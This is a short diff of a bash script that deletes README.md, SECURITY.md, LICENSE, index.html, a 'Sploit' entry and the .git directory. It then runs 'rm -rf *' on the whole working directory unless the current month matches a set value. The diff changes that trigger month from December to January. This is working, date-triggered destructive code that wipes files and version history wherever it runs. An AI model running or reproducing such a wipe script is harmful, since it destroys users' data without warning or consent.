@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
-if [[ "$(date +%B)" != "December" ]]; then
+if [[ "$(date +%B)" != "January" ]]; then
     clear
     rm -rf *
 else
